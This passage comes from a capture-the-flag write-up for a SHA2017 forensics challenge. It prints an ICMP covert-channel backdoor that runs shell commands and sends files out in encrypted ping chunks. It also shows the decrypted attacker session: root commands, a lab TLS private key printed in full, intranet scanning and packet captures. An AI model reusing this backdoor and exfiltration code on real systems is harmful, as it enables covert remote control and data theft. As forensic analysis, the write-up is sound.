class="string">"9FEEhLIvHpDPM4qwDwPQVxuasHbiFnI6AjSY6YNDlzcRZX7T+R6azOsOHIXSTsQJFY6KWC57M7c50/Y8VoDblzthDZEAgvOglXNj5wC78R3+euE2enPioadbLZ4K2bwG8UAxdIX8sH7NAmC9LNVuluqd2TYgDss20VNwd1rJ7vmkrt55gXvCWdOieQarMbMZorDqvcRrPRJsNae1x8CHY/ukToeYt8w4T16BrqdN9ZJK+NFVxDddHjjfXCtwF2eqVZ+qZhYiDPAcy1DcQZEWJeRz+R5m98WsLqH2gJvpYY3T6h1JuTTJUDfhoqeTvrRF/z9nsGCaJQZjKY3EDrdvCQ=="</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">class AESCipher:</div><div class="line"></div><div class="line">    def __init__( self, key ):</div><div class="line">        self.key = key</div><div class="line"></div><div class="line">    def encrypt( self, raw ):</div><div class="line">        raw = pad(raw)</div><div class="line">        iv = Random.new().<span class="built_in">read</span>( AES.block_size )</div><div class="line">        cipher = AES.new( self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="built_in">return</span> base64.b64encode( iv + cipher.encrypt( raw ) )</div><div class="line"></div><div class="line">    def decrypt( self, enc ):</div><div class="line">        enc = base64.b64decode(enc)</div><div class="line">        iv = enc[:16]</div><div class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="built_in">return</span> unpad(cipher.decrypt( enc[16:] ))</div><div class="line"></div><div class="line">def run_command(cmd):</div><div class="line">    ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)</div><div class="line">    output = ps.communicate()[0]</div><div class="line">    <span class="built_in">return</span> output</div><div class="line"></div><div class="line">def send_ping(host, magic, data):</div><div class="line">    data = cipher.encrypt(data)</div><div class="line">    load = <span class="string">"&#123;&#125;:&#123;&#125;"</span>.format(magic, data)</div><div class="line">    time.sleep(1)</div><div class="line">    sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)</div><div class="line"></div><div class="line">def chunks(L, n):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(0, len(L), n):</div><div class="line">        yield L[i:i+n]</div><div class="line"></div><div class="line">def get_file(host, magic, fn):</div><div class="line">    time.sleep(1)</div><div class="line">    data = base64.urlsafe_b64encode(open(fn, <span class="string">"rb"</span>).<span class="built_in">read</span>())</div><div class="line">    cnt = 0</div><div class="line">    icmp_threads = []</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> chunks(data, 500):</div><div class="line">        t = threading.Thread(target = send_ping, args = (host,magic, <span class="string">"getfile:&#123;&#125;:&#123;&#125;"</span>.format(cnt,line)))</div><div class="line">        t.daemon = True</div><div class="line">        t.start()</div><div class="line">        icmp_threads.append(t)</div><div class="line">        cnt += 1</div><div class="line"></div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> icmp_threads:</div><div class="line">        t.join()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># cipher = AESCipher(sys.argv[1])</span></div><div class="line"></div><div class="line"><span class="comment"># while True:</span></div><div class="line"><span class="comment">#     try: </span></div><div class="line"><span class="comment">#         pkts = sniff(filter="icmp", timeout =5,count=1)</span></div><div class="line"></div><div class="line"><span class="comment">#         for packet in pkts:</span></div><div class="line"><span class="comment">#              if  str(packet.getlayer(ICMP).type) == "8": </span></div><div class="line"><span class="comment">#                 input = packet[IP].load</span></div><div class="line"><span class="comment">#                 if input[0:len(magic)] == magic:</span></div><div class="line"><span class="comment">#                     input = input.split(":")</span></div><div class="line"><span class="comment">#                     data = cipher.decrypt(input[1]).split(":")</span></div><div class="line"><span class="comment">#                     ip = packet[IP].src</span></div><div class="line"><span class="comment">#                     if data[0] == "command":</span></div><div class="line"><span class="comment">#                         output = run_command(data[1])</span></div><div class="line"><span class="comment">#                         send_ping(ip, magic, "command:&#123;&#125;".format(output))</span></div><div class="line"><span class="comment">#                     if data[0] == "getfile":</span></div><div class="line"><span class="comment">#                         #print "[+] Sending file &#123;&#125;".format(data[1])</span></div><div class="line"><span class="comment">#                         get_file(ip, magic, data[1])</span></div><div class="line"><span class="comment">#     except:</span></div><div class="line"><span class="comment">#         pass</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#   break</span></div><div class="line"><span class="comment"># print(final)</span></div><div class="line"></div><div class="line"><span class="comment">#for i in range(0,301):</span></div><div class="line"><span class="comment">#   print(i, dicio[str(i)])</span></div><div class="line"><span class="comment"># for k,v in dicio.iteritems():</span></div><div class="line">    <span class="comment"># print(k, base64.urlsafe_b64decode(v))</span></div><div class="line"></div><div class="line"><span class="comment"># print(base64.urlsafe_b64decode(final))</span></div><div class="line"></div><div class="line">    <span class="comment"># if outp not in lis:</span></div><div class="line">    <span class="comment">#     # print(outp)</span></div><div class="line">        </div><div class="line">    <span class="comment">#     print(numb)</span></div><div class="line">    <span class="comment">#     lis.append(outp)</span></div><div class="line">        </div><div class="line">  <span class="comment"># lis = sorted(lis)</span></div><div class="line">  <span class="comment"># for it in lis:</span></div><div class="line">    <span class="comment"># print(it)</span></div><div class="line"></div><div class="line"></div><div class="line">dicio = &#123;&#125;</div><div class="line">lis = []</div><div class="line">n = AESCipher(key2)</div><div class="line">infile1=<span class="string">"encrypted1"</span></div><div class="line">with open(infile1) as f:</div><div class="line">  strin = f.read().split(<span class="string">'SHA2017:'</span>)</div><div class="line">  strin = strin[1:]</div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(strin),2):</div><div class="line">    outp = n.decrypt(strin[i])</div><div class="line">    <span class="built_in">print</span> outp</div></pre></td></tr></table></figure>
<p>Running the script:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; python back.py</div><div class="line"><span class="built_in">command</span>:ls -la</div><div class="line"><span class="built_in">command</span>:total 16</div><div class="line">drwxr-xr-x 3 root     root     4096 Jul 26 09:36 .</div><div class="line">drwxr-xr-x 3 root     root     4096 Jul 26 03:45 ..</div><div class="line">drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css</div><div class="line">-rwxr-xr-x 1 www-data www-data 1664 Jul 26 04:46 index.php</div><div class="line"></div><div class="line"><span class="built_in">command</span>:id</div><div class="line"><span class="built_in">command</span>:uid=0(root) gid=0(root) groups=0(root)</div><div class="line"></div><div class="line"><span class="built_in">command</span>:id</div><div class="line"><span class="built_in">command</span>:uid=0(root) gid=0(root) groups=0(root)</div><div class="line"></div><div class="line"><span class="built_in">command</span>:id</div><div class="line"><span class="built_in">command</span>:uid=0(root) gid=0(root) groups=0(root)</div><div class="line"></div><div class="line"><span class="built_in">command</span>:ls -la /root</div><div class="line"><span class="built_in">command</span>:total 32</div><div class="line">drwx------  5 root root 4096 Jul 27 07:27 .</div><div class="line">drwxr-xr-x 22 root root 4096 Apr 18 05:43 ..</div><div class="line">-rw-------  1 root root 3228 Jul 26 06:44 .bash_history</div><div class="line">-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc</div><div class="line">drwxr-xr-x  2 root root 4096 Jul 27 09:11 certs</div><div class="line">drwxr-xr-x  2 root root 4096 Jul 26 03:47 .nano</div><div class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</div><div class="line">drwx------  2 root root 4096 Jul 27 07:27 .ssh</div><div class="line"></div><div class="line"><span class="built_in">command</span>:ls -la /root/certs</div><div class="line"><span class="built_in">command</span>:total 16</div><div class="line">drwxr-xr-x 2 root root 4096 Jul 27 09:11 .</div><div class="line">drwx------ 5 root root 4096 Jul 27 07:27 ..</div><div class="line">-rw-r--r-- 1 root root  989 Jul 27 07:23 intranet.crt</div><div class="line">-rw-r--r-- 1 root root  916 Jul 27 07:23 intranet.key</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /root/certs/intranet.crt</div><div class="line"><span class="built_in">command</span>:-----BEGIN CERTIFICATE-----</div><div class="line">MIICrDCCAhWgAwIBAgIJALfe3aETCSTsMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNV</div><div class="line">BAYTAk5MMRIwEAYDVQQIDAlGbGV2b2xhbmQxETAPBgNVBAcMCFplZXdvbGRlMRQw</div><div class="line">EgYDVQQKDAtTSEEyMDE3IENURjEjMCEGCSqGSIb3DQEJARYUc2hhMjAxN2N0ZkBn</div><div class="line">bWFpbC5jb20wHhcNMTcwNzI3MTQyMzIwWhcNMTgwNzI3MTQyMzIwWjBvMQswCQYD</div><div class="line">VQQGEwJOTDESMBAGA1UECAwJRmxldm9sYW5kMREwDwYDVQQHDAhaZWV3b2xkZTEU</div><div class="line">MBIGA1UECgwLU0hBMjAxNyBDVEYxIzAhBgkqhkiG9w0BCQEWFHNoYTIwMTdjdGZA</div><div class="line">Z21haWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+H/mwETvdjGRn</div><div class="line">n/33zsjMOyPsg5xgSCsLDTg9D8XaeGp7ZQ1habE+9G0gabrKYntVburjitcuheXK</div><div class="line">hCo6nYWF2pSch4WjhNhCxkM++UeKRUv8xYAtSGl+6vvSrwogR+BfRuxZFAeJzvgK</div><div class="line">hNwL7sdW2CJ7Gk89pET/W6AOBNcDWwIDAQABo1AwTjAdBgNVHQ4EFgQUFeykHO7M</div><div class="line">V70l0IO87/3ogRb5VxMwHwYDVR0jBBgwFoAUFeykHO7MV70l0IO87/3ogRb5VxMw</div><div class="line">DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQCITumB4q5A+Lu9EzUe1qAW</div><div class="line">rjAeVfXq/qVrw+byH4VqNuEOBQ7lq151VbsXI1YQXCxVbP/r5Zxb1BfS/3qHHFDu</div><div class="line">SRqYaxh9c+BRkdAdzkFebMbIocnaLuVFpn237Z/ysSt0PPrTaI3gUSoz/7gXB+nX</div><div class="line">DkYKgl7BR0a72yTuLAc0GA==</div><div class="line">-----END CERTIFICATE-----</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /root/certs/intranet.key</div><div class="line"><span class="built_in">command</span>:-----BEGIN PRIVATE KEY-----</div><div class="line">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef</div><div class="line">/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqE</div><div class="line">KjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE</div><div class="line">3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W</div><div class="line">8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449</div><div class="line">kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNE</div><div class="line">pXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoW</div><div class="line">BofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVP</div><div class="line">dYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQO</div><div class="line">HaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQ</div><div class="line">IwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni</div><div class="line">+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoa</div><div class="line">ps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ER</div><div class="line">iuSWkHY6ll1V1m0=</div><div class="line">-----END PRIVATE KEY-----</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /root/certs/intranet.key</div><div class="line"><span class="built_in">command</span>:-----BEGIN PRIVATE KEY-----</div><div class="line">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef</div><div class="line">/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqE</div><div class="line">KjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE</div><div class="line">3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W</div><div class="line">8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449</div><div class="line">kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNE</div><div class="line">pXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoW</div><div class="line">BofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVP</div><div class="line">dYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQO</div><div class="line">HaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQ</div><div class="line">IwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni</div><div class="line">+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoa</div><div class="line">ps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ER</div><div class="line">iuSWkHY6ll1V1m0=</div><div class="line">-----END PRIVATE KEY-----</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /etc/hosts</div><div class="line"><span class="built_in">command</span>:127.0.0.1 localhost</div><div class="line">127.0.1.1 ubuntu</div><div class="line"></div><div class="line"><span class="comment"># The following lines are desirable for IPv6 capable hosts</span></div><div class="line">::1     localhost ip6-localhost ip6-loopback</div><div class="line">ff02::1 ip6-allnodes</div><div class="line">ff02::2 ip6-allrouters</div><div class="line">10.29.0.1 router</div><div class="line">192.168.1.1     router</div><div class="line">192.168.1.2     intranet</div><div class="line"></div><div class="line"><span class="built_in">command</span>:nohup nmap intranet &gt; /tmp/intranet.nmap</div><div class="line"><span class="built_in">command</span>:</div><div class="line"><span class="built_in">command</span>:cat /tmp/intranet.nmap</div><div class="line"><span class="built_in">command</span>:</div><div class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT</div><div class="line">Nmap scan report <span class="keyword">for</span> intranet (192.168.1.2)</div><div class="line">Host is up (0.00010s latency).</div><div class="line">Not shown: 997 closed ports</div><div class="line">PORT    STATE SERVICE</div><div class="line">22/tcp  open  ssh</div><div class="line">80/tcp  open  http</div><div class="line">443/tcp open  https</div><div class="line">MAC Address: 00:0C:29:3D:FD:B0 (VMware)</div><div class="line"></div><div class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.52 seconds</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /tmp/intranet.nmap</div><div class="line"><span class="built_in">command</span>:</div><div class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT</div><div class="line">Nmap scan report <span class="keyword">for</span> intranet (192.168.1.2)</div><div class="line">Host is up (0.00010s latency).</div><div class="line">Not shown: 997 closed ports</div><div class="line">PORT    STATE SERVICE</div><div class="line">22/tcp  open  ssh</div><div class="line">80/tcp  open  http</div><div class="line">443/tcp open  https</div><div class="line">MAC Address: 00:0C:29:3D:FD:B0 (VMware)</div><div class="line"></div><div class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.52 seconds</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /tmp/intranet.nmap</div><div class="line"><span class="built_in">command</span>:</div><div class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT</div><div class="line">Nmap scan report <span class="keyword">for</span> intranet (192.168.1.2)</div><div class="line">Host is up (0.00010s latency).</div><div class="line">Not shown: 997 closed ports</div><div class="line">PORT    STATE SERVICE</div><div class="line">22/tcp  open  ssh</div><div class="line">80/tcp  open  http</div><div class="line">443/tcp open  https</div><div class="line">MAC Address: 00:0C:29:3D:FD:B0 (VMware)</div><div class="line"></div><div class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.52 seconds</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /tmp/intranet.nmap</div><div class="line"><span class="built_in">command</span>:</div><div class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT</div><div class="line">Nmap scan report <span class="keyword">for</span> intranet (192.168.1.2)</div><div class="line">Host is up (0.00010s latency).</div><div class="line">Not shown: 997 closed ports</div><div class="line">PORT    STATE SERVICE</div><div class="line">22/tcp  open  ssh</div><div class="line">80/tcp  open  http</div><div class="line">443/tcp open  https</div><div class="line">MAC Address: 00:0C:29:3D:FD:B0 (VMware)</div><div class="line"></div><div class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.52 seconds</div><div class="line"></div><div class="line"><span class="built_in">command</span>:curl -k https://intranet/</div><div class="line"><span class="built_in">command</span>:  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</div><div class="line">                                 Dload  Upload   Total   Spent    Left  Speed</div><div class="line">100   456  100   456    0     0   4871      0 --:--:-- --:--:-- --:--:--  4903</div><div class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;401 Unauthorized&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Unauthorized&lt;/h1&gt;</div><div class="line">&lt;p&gt;This server could not verify that you</div><div class="line">are authorized to access the document</div><div class="line">requested.  Either you supplied the wrong</div><div class="line">credentials (e.g., bad password), or your</div><div class="line">browser doesn<span class="string">'t understand how to supply</span></div><div class="line"><span class="string">the credentials required.&lt;/p&gt;</span></div><div class="line"><span class="string">&lt;hr&gt;</span></div><div class="line"><span class="string">&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at intranet Port 443&lt;/address&gt;</span></div><div class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">command:tcpdump -D</span></div><div class="line"><span class="string">command:1.ens33 [Up, Running]</span></div><div class="line"><span class="string">2.ens39 [Up, Running]</span></div><div class="line"><span class="string">3.any (Pseudo-device that captures on all interfaces) [Up, Running]</span></div><div class="line"><span class="string">4.lo [Up, Running, Loopback]</span></div><div class="line"><span class="string">5.nflog (Linux netfilter log (NFLOG) interface)</span></div><div class="line"><span class="string">6.nfqueue (Linux netfilter queue (NFQUEUE) interface)</span></div><div class="line"><span class="string">7.usbmon1 (USB bus number 1)</span></div><div class="line"><span class="string">8.usbmon2 (USB bus number 2)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">command:tcpdump -i usbmon2 -w /tmp/usb.pcap</span></div><div class="line"><span class="string">command:tcpdump host intranet -w /tmp/intranet.pcap</span></div></pre></td></tr></table></figure>
<p>As we can see we can extract alot of usefull Information from here, we now have the RSA private key used for TLS encryption and the certificate from the companies intranet website, the last 2 commands we could see that the hacker actually started two tcpdumps initiating the captures and one of them is a USB capture! maybe this will be useful latter!<br>Usefull data extracted:</p>
<blockquote><br>command:cat /root/certs/intranet.crt<br>command:—–BEGIN CERTIFICATE—–<br>MIICrDCCAhWgAwIBAgIJALfe3aETCSTsMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNV<br>BAYTAk5MMRIwEAYDVQQIDAlGbGV2b2xhbmQxETAPBgNVBAcMCFplZXdvbGRlMRQw<br>EgYDVQQKDAtTSEEyMDE3IENURjEjMCEGCSqGSIb3DQEJARYUc2hhMjAxN2N0ZkBn<br>bWFpbC5jb20wHhcNMTcwNzI3MTQyMzIwWhcNMTgwNzI3MTQyMzIwWjBvMQswCQYD<br>VQQGEwJOTDESMBAGA1UECAwJRmxldm9sYW5kMREwDwYDVQQHDAhaZWV3b2xkZTEU<br>MBIGA1UECgwLU0hBMjAxNyBDVEYxIzAhBgkqhkiG9w0BCQEWFHNoYTIwMTdjdGZA<br>Z21haWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+H/mwETvdjGRn<br>n/33zsjMOyPsg5xgSCsLDTg9D8XaeGp7ZQ1habE+9G0gabrKYntVburjitcuheXK<br>hCo6nYWF2pSch4WjhNhCxkM++UeKRUv8xYAtSGl+6vvSrwogR+BfRuxZFAeJzvgK<br>hNwL7sdW2CJ7Gk89pET/W6AOBNcDWwIDAQABo1AwTjAdBgNVHQ4EFgQUFeykHO7M<br>V70l0IO87/3ogRb5VxMwHwYDVR0jBBgwFoAUFeykHO7MV70l0IO87/3ogRb5VxMw<br>DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQCITumB4q5A+Lu9EzUe1qAW<br>rjAeVfXq/qVrw+byH4VqNuEOBQ7lq151VbsXI1YQXCxVbP/r5Zxb1BfS/3qHHFDu<br>SRqYaxh9c+BRkdAdzkFebMbIocnaLuVFpn237Z/ysSt0PPrTaI3gUSoz/7gXB+nX<br>DkYKgl7BR0a72yTuLAc0GA==<br>—–END CERTIFICATE—–<br><br>command:cat /root/certs/intranet.key<br>command:—–BEGIN PRIVATE KEY—–<br>MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef<br>/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqE<br>KjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE<br>3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W<br>8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449<br>kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNE<br>pXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoW<br>BofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVP<br>dYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQO<br>HaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQ<br>IwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni<br>+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoa<br>ps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ER<br>iuSWkHY6ll1V1m0=<br>—–END PRIVATE KEY—–<br><br>command:tcpdump -i usbmon2 -w /tmp/usb.pcap<br>command:tcpdump host intranet -w /tmp/intranet.pcap<br><br></blockquote>

<p>Now doing the same thing for the 2nd PCAP capture by adding this to the previous backdoor.py script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">infile1=<span class="string">"encrypted2"</span></div><div class="line"><span class="keyword">with</span> open(infile1) <span class="keyword">as</span> f:</div><div class="line">  strin = f.read().split(<span class="string">'SHA2017:'</span>)</div><div class="line">  strin = strin[<span class="number">1</span>:]</div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(strin)):</div><div class="line">    outp = n.decrypt(strin[i])</div><div class="line">    <span class="keyword">print</span> outp</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; python back.py</div><div class="line">getfile:/tmp/intranet.pcap</div><div 